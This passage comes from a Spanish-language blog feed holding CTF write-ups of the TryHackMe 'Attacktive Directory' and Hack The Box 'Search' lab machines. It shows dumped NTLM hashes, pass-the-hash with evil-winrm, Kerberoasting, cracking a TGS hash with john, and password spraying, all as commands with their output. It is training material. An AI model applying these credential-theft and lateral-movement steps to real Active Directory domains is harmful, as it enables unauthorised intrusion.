spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# evil-winrm -i 10.10.165.157 -u &apos;administrator&apos; -H &apos;0e0363213e37b94221497260b0bcb4fc&apos;
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
thm-ad\administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Comprometida AD ~ K0H4ck&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="THM," /><category term="Enumeration," /><category term="SMB," /><category term="Kerbrute" /><category term="Userenum," /><category term="ASPREPRoast" /><category term="Attack," /><category term="Kerberoasting" /><category term="Attack," /><category term="Secretsdumps.py," /><category term="Maquina" /><category term="Gratuitas." /><summary type="html">Attacktive ~ Try Hack Me</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/05/Search-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-05T00:00:00-03:00</published><updated>2022-06-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/05/Search-AD</id><content type="html" xml:base="http://localhost:4000/2022/06/05/Search-AD.html">&lt;h1 id=&quot;search--hack-the-box&quot;&gt;Search ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.129       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION                                                                                                       
53/tcp    open  domain        Simple DNSPlus                                                                                                                                                                         
80/tcp    open  http          Microsoft IIS httpd 10.0         
| http-methods:                                                                                          
|_  Potentially risky methods: TRACE                                                                                                                                                                               
|_http-server-header: Microsoft-IIS/10.0     
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                           
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-24 18:38:51Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                     
135/tcp   open  msrpc         Microsoft Windows RPC                                                      
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                        
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                
| Not valid before: 2020-08-11T08:13:35                                                                                                                                                                                                          
|_Not valid after:  2030-08-09T08:13:35                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                            
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0                                                    
| http-methods:                                                                                                         
|_  Potentially risky methods: TRACE                                                                                    
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                                               
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                                                                                             
| Not valid before: 2020-08-11T08:13:35                                                                                               
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
| tls-alpn:                                                                                                                                 
|_  http/1.1                              
445/tcp   open  microsoft-ds?                                                                                 
464/tcp   open  kpasswd5?                          
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                       
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                     
|_Not valid after:  2030-08-09T08:13:35            
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                                                     
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                  
|_Not valid after:  2030-08-09T08:13:35                                                                                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.
|_http-server-header: Microsoft-IIS/10.0                              
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title.                                                                                                    
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH                                                                                                                      
| Not valid before: 2020-04-07T09:05:25                                                                                                     
|_Not valid after:  2030-04-05T09:05:25                                                                                                     
|_ssl-date: 2021-12-24T18:40:22+00:00; +1s from scanner time.                                            
| tls-alpn:                                                           
|_  http/1.1                                                                                                                                                             
9389/tcp  open  mc-nmf        .NET Message Framing                    
49667/tcp open  msrpc         Microsoft Windows RPC                   
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                    
49670/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49691/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49701/tcp open  msrpc         Microsoft Windows RPC                                 
49725/tcp open  msrpc         Microsoft Windows RPC                   
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
                                                                                                                                            
Host script results:                                                                                                                                                     
| smb2-security-mode:                                                                                                                                                    
|   2.02:                                                                                                
|_    Message signing enabled and required                                                                                                  
| smb2-time:                                                                        
|   date: 2021-12-24T18:39:43                                                                            
|_  start_date: N/A      
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos procedemos a añadir el commonName de la maquina al /etc/hosts/  –&amp;gt; search.htb research.htb&lt;/p&gt;

&lt;p&gt;Seguimos enumerando informcion, empezando por la pagina WEB&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.11.129 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS], X-Powered-By[ASP.NET]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar la pagina web visualmente.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encontramos la siguiente credencial y user &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.11.129/images/slide_2.jpg&quot;&lt;/span&gt;
User: &lt;span class=&quot;s2&quot;&gt;&quot;Hope Sharp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Pass: &lt;span class=&quot;s2&quot;&gt;&quot;IsolationIsKey?&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Verificamos con Crackmapexec la credencial obtenida para el usuario hope.sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u hope.sharp -p &apos;IsolationIsKey?&apos;&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a intentar conectarnos a los recursos de SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;&apos; -H 10.10.11.129                                                                                                                          &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos Usuarios del Sistema por SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    ..
        dr--r--r--                0 Tue Apr  7 20:12:58 2020    abril.suarez
        dr--r--r--                0 Fri Jul 31 15:11:32 2020    Angie.Duffy
        dr--r--r--                0 Fri Jul 31 14:35:32 2020    Antony.Russo
        dr--r--r--                0 Tue Apr  7 20:32:31 2020    belen.compton
        dr--r--r--                0 Fri Jul 31 14:37:36 2020    Cameron.Melendez
        dr--r--r--                0 Tue Apr  7 20:15:09 2020    chanel.bell
        dr--r--r--                0 Fri Jul 31 15:09:07 2020    Claudia.Pugh
        dr--r--r--                0 Fri Jul 31 14:02:04 2020    Cortez.Hickman
        dr--r--r--                0 Tue Apr  7 20:20:08 2020    dax.santiago
        dr--r--r--                0 Fri Jul 31 13:55:34 2020    Eddie.Stevens
        dr--r--r--                0 Thu Apr  9 22:04:11 2020    edgar.jacobs
        dr--r--r--                0 Fri Jul 31 14:39:50 2020    Edith.Walls
        dr--r--r--                0 Tue Apr  7 20:23:13 2020    eve.galvan
        dr--r--r--                0 Tue Apr  7 20:29:22 2020    frederick.cuevas
        dr--r--r--                0 Thu Apr  9 16:34:41 2020    hope.sharp
        dr--r--r--                0 Tue Apr  7 20:07:00 2020    jayla.roberts
        dr--r--r--                0 Fri Jul 31 15:01:06 2020    Jordan.Gregory
        dr--r--r--                0 Thu Apr  9 22:11:39 2020    payton.harmon
        dr--r--r--                0 Fri Jul 31 13:44:32 2020    Reginald.Morton
        dr--r--r--                0 Tue Apr  7 20:10:25 2020    santino.benjamin
        dr--r--r--                0 Fri Jul 31 14:21:42 2020    Savanah.Velazquez
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    sierra.frye
        dr--r--r--                0 Thu Apr  9 22:14:26 2020    trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a crearnos un listado de Usuarios Potenciales.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos; | awk &apos;NF{print $NF}&apos; | tail -n 23 &amp;gt; &quot;users.txt&quot;&lt;/span&gt;
abril.suarez
Angie.Duffy
Antony.Russo
belen.compton
Cameron.Melendez
chanel.bell
Claudia.Pugh
Cortez.Hickman
dax.santiago
Eddie.Stevens
edgar.jacobs
Edith.Walls
eve.galvan
frederick.cuevas
hope.sharp
jayla.roberts
Jordan.Gregory
payton.harmon
Reginald.Morton
santino.benjamin
Savanah.Velazquez
sierra.frye
trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a realizar un ASPRepRoast Attack con el listado de usuarios encontrado:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;No encontramos ningun usuario ASPRepRoasteable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a realizar un Kerberoasting Attack ya que tenemos las credenciales para el usuario Hope.Sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos;&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt; 

&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos; -request&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt;               



&lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;web_svc&lt;span class=&quot;nv&quot;&gt;$SEARCH&lt;/span&gt;.HTB&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;.htb/web_svc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cbf7ed318a7ad8cef8eb9e0e46d358f2$bf63b6d423102abf531eb367994089d64a58d07aa240148ae60a26dd7e4c556b5a5916833b383160108453c1c1ee2cce944fa0a37024e5843d01c522a7a3169d622839224ae5132b1a83b77d2c6d0157fd046088594e020325b94c4adc9bfb3cec364a71962220599f0fede8af038bbc894748faade1ac12305969d26705a97902f3e8ea4ed9073a03c21ff05681f6da028330c3a399a006111936fdccf0fa74f8f97e4c9f8ab1fa410d9a1814ab455d9c4402a54a0ec8011b62d076858471b66413743908639c886cf4f6735605c44fc82794d87231cfab376d6aba77654634c293afa887fde00e430a2be1c381608a0d49ec454d7017f137c1308347702aa0e34f144ac7d917984e5d46dc64d06212bc292bb5e3a9f47b3bb2eed119ca8477250f70246882243dde35cbee1d206ffb0f01362aceb7dd6a96c12ebb40cd94e4d7301123556c1506218961effc6d5bd3be6cae7d312a9f9e2a702132c385cf8cb7b790a3b6d1aa81fc9cb424805dbac398d35f2ffd3dd41e1a3014bbc41933b298c18796890c164ac99ff19581a67be244242e033ee6541596c57055a84c47e05be885cca5ed5f6db6e99036a2ab307c1b07bb96f0618267831f7fe203d16766318c109893b7b516bdda7eb07c2810c7dd6ac21cd0f3e738c82a0de6244d2cc83fc69edd068fe5912cfedb7933aa64fd5b020a575dc297f5a4ca4b38d0287cd8393219ad552f0bdfc0a487a44100fa0732d5477f2e7571d965e1d2e4ecdff110a28b35b4c53010d7d737c4a11614f679f86dd06b9e161825bcdc400c146a0cf2b43816bb4fcc22f86ca98c90f13d7f807f221d5c5b7f9cc136249432ddcb50be81d2bfc7d62a085ee7cbc2ded6a2b655abf119bb1d1a16116354b4f83e35ab2842f77a44f1156749b2c96ab21b25bd6b971260350ef6446f0674ecf409bc4b0b5d9f5adc4fdc729177e9a7c5fad3ac215ffca8e32e2f6a944efd3f0c630c74f17529631599eb24e1363056f3f544b6951a8b0749065c90f60b4bcf2c431f3c0827fc7135a4c22fdc3189a56bf03851ba0c97bfa5379e18912c0bba137b360ab1b9e44a921176e3d0f2f961bb4fd1ff3bcbb0d7b4b5e82a95ea6d4bbb1896cd36f665b05a8e63c3e9b7885e11b9b2a0c84b946ad34985f4215db8c075127149baae3a4e967e7754790c701f8fabb802ae25d605446581ad6e84bb30445fb49c87ebdb392678a78dccfe9c77a0cd724d143dd2051a7f4dc21ccd1d83ce673354fc4ef171dff5f9bc8bfe4cc72c4f4ed3c538f01129b46ea227c0b378555c807fee342a2fde76aebcb8dec3535d9ae58e22310a4b7483c023047e10c46efbef021ed13c5a7034213aa2b7671569fdfaeb9632c2e8827e7f3f660d68837ed0fb069ad62575c649dd894d47e5f624d1fbd53a9653b0fed574873757319e4439f98ffb966844bc39b7a65915d18efdca4687893994680aa4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a a intentar Crackear el TGS para sacar la password en texto claro&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash_web_svc &lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 8 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;s2&quot;&gt;&quot; @3ONEmillionbaby (web_svc)  &quot;&lt;/span&gt;   
1g 0:00:00:03 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-06-06 12:03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.3012g/s 3461Kp/s 3461Kc/s 3461KC/s @4208891ncv..?!&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Dopey&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;?!
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedo a hacer un password Spray con el listado de usuarios y la nueva contraseña conseguida&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u users -p &apos;@3ONEmillionbaby&apos; --continue-on-success          &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                            
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_svc:@3ONEmillionbaby                                                                                                                                                      
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;dgar.jacobs:@3ONEmillionbaby
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a seguir ojeando los recursos de SMB para el nuevo usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edgar.jacobs&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/edgar.jacobs/Desktop&apos;  &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
